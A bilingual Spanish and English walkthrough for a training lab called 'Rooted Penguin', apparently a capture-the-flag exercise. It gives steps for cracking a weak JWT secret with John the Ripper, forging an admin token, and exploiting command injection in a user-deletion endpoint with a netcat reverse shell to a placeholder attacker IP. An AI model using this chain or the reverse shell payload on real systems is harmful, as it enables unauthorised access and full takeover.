# Rooted Penguin - Guía Rápida | Quick Start Guide

---

## 🇪🇸 GUÍA RÁPIDA (ESPAÑOL)

### Passos Críticos para Resolver el Laboratorio

**1. Escaneo Inicial**
   - Ejecutar: `nmap -sV <IP_TARGET>`
   - Puertos abiertos esperados: 5173 (React/Vite) y 8000 (API Backend)

**2. Reconocimiento del Sistema**
   - Visitar `http://<IP>:5173` - Página temática de pingüinos
   - Visitar `http://<IP>:8000` - Documentación de API
   - Probar con usuario "admin" en registro para confirmar divulgación de información

**3. Crear Usuario de Prueba**
   - Registrarse con credenciales: `user:user`
   - Acceder al perfil de usuario
   - Analizar tráfico con Burp Suite

**4. Interceptar y Analizar JWT**
   - Interceptar token de sesión con Burp Suite
   - Decodificar JWT visible en la respuesta
   - Guardar el token para análisis

**5. Ataque de Fuerza Bruta al Secret**
   - Extraer el JWT del tráfico
   - Usar John the Ripper: `john --wordlist=diccionario.txt hash.txt`
   - Secret descubierto: es corto y débil

**6. Forjar Token Admin**
   - Usar JWT.io (https://jwt.io)
   - Cambiar payload a:
     ```json
     {
         "sub": "admin",
         "role": "admin",
         "exp": 1772137761
     }
     ```
   - Firmar con el secret descubierto

**7. Inyectar Token en localStorage**
   - Abrir DevTools (F12)
   - Consola: `localStorage.setItem('token', 'NUEVO_TOKEN_AQUI')`
   - Recargar la página

**8. Acceder a Panel Admin**
   - Verificar acceso a endpoints protegidos
   - `/users` - Listar todos los usuarios del sistema
   - Revisar perfil de usuario con payload XSS potencial

**9. Explotar Inyección de Comandos**
   - Identificar endpoint: DELETE `/users/{username}`
   - Probar: `sleep 5` para validar
   - Preparar payload de reverse shell (Base64 + URL-encoded)
   - Payload ejemplo: `nc -e /bin/sh <IP_ATACANTE> 4444`

**10. Obtener Reverse Shell**
   - Listener en máquina atacante: `nc -lvnp 4444`
   - Ejecutar payload codificado contra endpoint DELETE
   - **¡ROOT!** Acceso directo obtenido

### Comandos Clave (Resumen)
```bash
# Nmap scan
nmap -sV 192.168.1.X

# John para fuerza bruta
john --wordlist=rockyou.txt token_hash.txt

# Listener para reverse shell
nc -lvnp 4444

# Verificar acceso root
whoami
id
```

---

## 🇬🇧 QUICK START GUIDE (ENGLISH)

### Critical Steps to Solve the Laboratory

**1. Initial Scan**
   - Execute: `nmap -sV <IP_TARGET>`
   - Expected open ports: 5173 (React/Vite) and 8000 (API Backend)

**2. System Reconnaissance**
   - Visit `http://<IP>:5173` - Penguin-themed page
   - Visit `http://<IP>:8000` - API documentation
   - Test with "admin" user in registration to confirm information disclosure

**3. Create Test User**
   - Register with credentials: `user:user`
   - Access user profile
   - Analyze traffic with Burp Suite

**4. Intercept and Analyze JWT**
   - Intercept session token with Burp Suite
   - Decode visible JWT in response
   - Save token for analysis

**5. Brute Force Attack on Secret**
   - Extract JWT from traffic
   - Use John the Ripper: `john --wordlist=dictionary.txt hash.txt`
   - Discovered secret: is short and weak

**6. Forge Admin Token**
   - Use JWT.io (https://jwt.io)
   - Change payload to:
     ```json
     {
         "sub": "admin",
         "role": "admin",
         "exp": 1772137761
     }
     ```
   - Sign with the discovered secret

**7. Inject Token into localStorage**
   - Open DevTools (F12)
   - Console: `localStorage.setItem('token', 'NEW_TOKEN_HERE')`
   - Reload the page

**8. Access Admin Panel**
   - Verify access to protected endpoints
   - `/users` - List all system users
   - Review user profile with potential XSS payload

**9. Exploit Command Injection**
   - Identify endpoint: DELETE `/users/{username}`
   - Test: `sleep 5` to validate
   - Prepare reverse shell payload (Base64 + URL-encoded)
   - Example payload: `nc -e /bin/sh <ATTACKER_IP> 4444`

**10. Obtain Reverse Shell**
   - Listener on attacker machine: `nc -lvnp 4444`
   - Execute encoded payload against DELETE endpoint
   - **ROOT!** Direct access obtained

### Key Commands (Summary)
```bash
# Nmap scan
nmap -sV 192.168.1.X

# John for brute force
john --wordlist=rockyou.txt token_hash.txt

# Listener for reverse shell
nc -lvnp 4444

# Verify root access
whoami
id
```

---
